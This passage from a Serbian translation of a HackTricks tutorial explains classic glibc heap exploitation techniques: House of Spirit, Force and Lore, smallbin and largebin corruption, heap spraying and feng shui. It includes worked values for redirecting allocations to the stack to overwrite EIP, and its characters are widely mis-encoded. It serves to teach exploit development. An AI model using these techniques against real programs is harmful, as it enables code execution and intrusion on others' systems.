**av->max\_fast** ƒáe biti EBP i biƒáe vrednost koja ƒáe nam omoguƒáiti da preskoƒçimo ograniƒçenja.

U **av->fastbins\[0]** ƒáe se prebrisati sa adresom **p** i biƒáe RET, tako da ƒáe se preskoƒçiti do shellcode.

Takoƒëe, u **av->system\_mem** (1484 bajta iznad pozicije na steku) ƒáe biti dovoljno smeƒáa koje ƒáe nam omoguƒáiti da preskoƒçimo proveru koja se vr≈°i.

Takoƒëe, mora se ispuniti uslov da susedni deo osloboƒëenog dela bude veƒái od 8 -> Po≈°to smo rekli da je veliƒçina osloboƒëenog dela 16, u ovom la≈ænom delu samo treba staviti veliƒçinu veƒáu od 8 (kako ƒáe shellcode biti u osloboƒëenom delu, treba staviti na poƒçetak jmp koji ƒáe pasti na nops koji idu nakon polja size novog la≈ænog dela).

**The House of Spirit**

U ovom sluƒçaju tra≈æimo da imamo pokazivaƒç na malloc koji mo≈æe biti promenjen od strane napadaƒça (na primer, da pokazivaƒç bude na steku ispod moguƒáeg prelivanja promenljive).

Na taj naƒçin, mogli bismo da navedemo da ovaj pokazivaƒç pokazuje gde god ≈æelimo. Meƒëutim, ne svako mesto je validno, veliƒçina la≈ænog dela mora biti manja od av->max\_fast i taƒçnije jednaka veliƒçini koja ƒáe biti tra≈æena u buduƒáem pozivu malloc()+8. Zbog toga, ako znamo da se nakon ovog ranjivog pokazivaƒça poziva malloc(40), veliƒçina la≈ænog dela mora biti jednaka 48.

Na primer, ako program pita korisnika za broj, mogli bismo uneti 48 i usmeriti promenljivi pokazivaƒç malloc na sledeƒáih 4 bajta (koji bi mogli pripadati EBP sa sreƒáom, tako da 48 ostaje iza, kao da je veliƒçina zaglavlja). Takoƒëe, adresa ptr-4+48 mora zadovoljiti nekoliko uslova (u ovom sluƒçaju ptr=EBP), tj. 8 < ptr-4+48 < av->system\_mem.

U sluƒçaju da se ovo ispuni, kada se pozove sledeƒái malloc koji smo rekli da je malloc(40), kao adresi ƒáe biti dodeljena adresa EBP. U sluƒçaju da napadaƒç takoƒëe mo≈æe kontrolisati ≈°ta se pi≈°e u ovom mallocu, mo≈æe prebrisati kako EBP tako i EIP sa adresom koju ≈æeli.

Mislim da je to zato ≈°to kada se oslobodi free() ƒçuvaƒáe se da u adresi koja pokazuje na EBP steka postoji deo veliƒçine savr≈°ene za novi malloc() koji se ≈æeli rezervisati, pa ƒáe mu biti dodeljena ta adresa.

**The House of Force**

Potrebno je:

* Prekoraƒçenje u delu koje omoguƒáava prebrisivanje wilderness
* Poziv malloc() sa veliƒçinom definisanom od strane korisnika
* Poziv malloc() ƒçiji podaci mogu biti definisani od strane korisnika

Prvo ≈°to se radi je prebrisivanje veliƒçine dela wilderness sa veoma velikom vredno≈°ƒáu (0xffffffff), tako da ƒáe svaki zahtev za memorijom dovoljno velik biti obraƒëen u \_int\_malloc() bez potrebe za pro≈°irivanjem hipa.

Drugo je promena av->top kako bi pokazivao na deo memorije pod kontrolom napadaƒça, kao ≈°to je stek. U av->top ƒáe se staviti \&EIP - 8.

Mora se prebrisati av->top kako bi pokazivao na deo memorije pod kontrolom napadaƒça:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim uzima vrednost adrese trenutnog dela wilderness (trenutni av->top) i remainder je taƒçno suma te adrese plus koliƒçina bajtova tra≈æena od malloc(). Dakle, ako je \&EIP-8 na 0xbffff224 i av->top sadr≈æi 0x080c2788, tada je koliƒçina koju moramo rezervisati u kontrolisanom mallocu kako bi av->top pokazivao na $EIP-8 za sledeƒái malloc() ƒáe biti:

0xbffff224 - 0x080c2788 = 3086207644.

Na taj naƒçin ƒáe se saƒçuvati promenjena vrednost u av->top i sledeƒái malloc ƒáe pokazivati na EIP i moƒái ƒáe ga prebrisati.

Va≈æno je znati da veliƒçina novog dela wilderness bude veƒáa od zahteva poslednjeg malloc(). Drugim reƒçima, ako wilderness pokazuje na \&EIP-8, veliƒçina ƒáe biti taƒçno u polju EBP steka.

**The House of Lore**

**Korupcija SmallBin**

Osloboƒëeni delovi se ubacuju u bin u zavisnosti od njihove veliƒçine. Ali pre nego ≈°to se ubace, ƒçuvaju se u unsorted bins. Deo koji je osloboƒëen ne stavlja se odmah u svoj bin veƒá ostaje u unsorted bins. Zatim, ako se rezervi≈°e novi deo i prethodno osloboƒëeni mo≈æe poslu≈æiti, vraƒáa se, ali ako se rezervi≈°e veƒái deo, osloboƒëeni deo u unsorted bins se stavlja u odgovarajuƒái bin.

Da bi se do≈°lo do ranjivog koda, zahtev za memorijom mora biti veƒái od av->max\_fast (obiƒçno 72) i manji od MIN\_LARGE\_SIZE (512).

Ako u binu postoji deo odgovarajuƒáe veliƒçine zahtevanog dela, on se vraƒáa nakon ≈°to se odve≈æe:

bck = victim->bk; Pokazuje na prethodni deo, to je jedina informacija koju mo≈æemo promeniti.

bin->bk = bck; Predzadnji deo postaje poslednji, u sluƒçaju da bck pokazuje na stek, sledeƒáem rezervisanom delu biƒáe dodeljena ova adresa

bck->fd = bin; Zatvara se lista tako ≈°to ovaj pokazuje na bin

Potrebno je:
Rezervi≈°ite dva malloc-a, tako da se prvi mo≈æe preplaviti nakon ≈°to je drugi osloboƒëen i ubaƒçen u svoj bin (tj. rezervisan je malloc veƒái od drugog dela pre prelivanja)

Malloc rezervisan za adresu koju odabere napadaƒç mora biti pod kontrolom napadaƒça.

Cilj je sledeƒái, ako mo≈æemo preplaviti heap koji ima osloboƒëen deo ispod i u svom binu, mo≈æemo promeniti njegov pokazivaƒç bk. Ako promenimo pokazivaƒç bk i taj deo postane prvi na listi binova i rezervisan je, bin ƒáe biti prevaren i reƒái ƒáe mu se da je sledeƒái deo liste (sledeƒái koji se nudi) na la≈ænoj adresi koju smo postavili (na stack ili GOT na primer). Dakle, ako se rezervi≈°e jo≈° jedan deo i napadaƒç ima dozvole na njemu, dobiƒáe deo na ≈æeljenoj poziciji i moƒái ƒáe da pi≈°e u njega.

Nakon ≈°to se modifikovani deo oslobodi, potrebno je rezervisati deo veƒái od osloboƒëenog, tako da modifikovani deo izaƒëe iz unsorted binova i ubaci se u svoj bin.

Kada je u svom binu, vreme je da se promeni pokazivaƒç bk preko prelivanja kako bi pokazivao na adresu koju ≈æelimo da prepisujemo.

Dakle, bin mora da saƒçeka da se pozove dovoljno puta malloc() kako bi se ponovo koristio modifikovani bin i prevario bin tako ≈°to ƒáe mu se reƒái da je sledeƒái deo na la≈ænoj adresi. Zatim ƒáe se dati deo koji nas zanima.

Da bi se ranjivost izvr≈°ila ≈°to je pre moguƒáe, idealno bi bilo: Rezervacija ranjivog dela, rezervacija dela koji ƒáe se modifikovati, osloboƒëenje ovog dela, rezervacija dela veƒáeg od onog koji ƒáe se modifikovati, modifikacija dela (ranjivost), rezervacija dela iste veliƒçine kao ranjeno i rezervacija drugog dela iste veliƒçine koji ƒáe pokazivati na odabranu adresu.

Za za≈°titu od ovog napada koristi se tipiƒçna provera da deo "nije" la≈æan: proverava se da li bck->fd pokazuje na ≈ærtvu. Drugim reƒçima, u na≈°em sluƒçaju, ako pokazivaƒç fd* la≈ænog dela pokazuje na ≈ærtvu na stacku. Da bi prevazi≈°ao ovu za≈°titu, napadaƒç bi trebalo na neki naƒçin (verovatno preko stacka) da bude u moguƒánosti da pi≈°e na odgovarajuƒáu adresu adresu ≈ærtve. Tako ƒáe izgledati kao pravi deo.

**Korupcija LargeBin**

Potrebni su isti zahtevi kao i pre, plus neki dodatni, osim toga, rezervisani delovi moraju biti veƒái od 512.

Napad je kao i prethodni, tj. treba promeniti pokazivaƒç bk i potrebni su svi ti pozivi malloc(), ali takoƒëe treba promeniti veliƒçinu modifikovanog dela tako da taj size - nb bude < MINSIZE.

Na primer, treba postaviti size na 1552 kako bi 1552 - 1544 = 8 < MINSIZE (oduzimanje ne mo≈æe biti negativno jer se uporeƒëuje sa unsigned)

Takoƒëe je uveden zakrpa da bi se to uƒçinilo jo≈° slo≈æenijim.

**Raspr≈°ivanje Heap-a**

Osnovna ideja je rezervisati ≈°to je vi≈°e moguƒáe memorije za heap-ove i popuniti ih jastukom od nopsa zavr≈°enim shellcode-om. Takoƒëe se koristi 0x0c kao jastuk. Poku≈°aƒáe se skoƒçiti na adresu 0x0c0c0c0c, pa ako se prepisuje neka adresa na koju ƒáe se pozvati ovaj jastuk, skoƒçiƒáe tamo. Osnovna taktika je rezervisati ≈°to je vi≈°e moguƒáe kako bi se videlo da li se prepisuje neki pokazivaƒç i skoƒçiti na 0x0c0c0c0c u nadi da ƒáe tamo biti nops.

**Feng Shui Heap-a**

Sastoji se u cementiranju memorije putem rezervacija i osloboƒëenja kako bi se ostavili rezervisani delovi izmeƒëu slobodnih delova. Bafer za prelivanje ƒáe se nalaziti u jednom od tih delova.

## Interesantni kursevi

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Reference**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naƒçini podr≈°ke HackTricks-u:

* Ako ≈æelite da vidite **va≈°u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili **telegram grupi** ili nas **pratite** na **Twitteru** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
